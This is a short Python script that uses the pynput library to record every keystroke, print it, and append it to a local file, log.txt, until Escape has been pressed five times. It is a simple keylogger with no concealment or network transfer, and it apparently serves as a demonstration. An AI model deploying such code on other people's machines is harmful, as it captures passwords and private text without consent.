from pynput import keyboard


def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        with open("log.txt", "a", encoding='utf-8') as file:
            text = ("{0}".format(key.char))
            file.write(text)
    except AttributeError:
        print('special key {0} pressed'.format(key))
        with open("log.txt", "a", encoding='utf-8') as file:
            text = ("|{0}|".format(key))
            file.write(text)


count = 0


def on_release(key):
    global count
    if key == keyboard.Key.esc:
        count += 1
        print("Count: ",count)
    if count >= 5:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
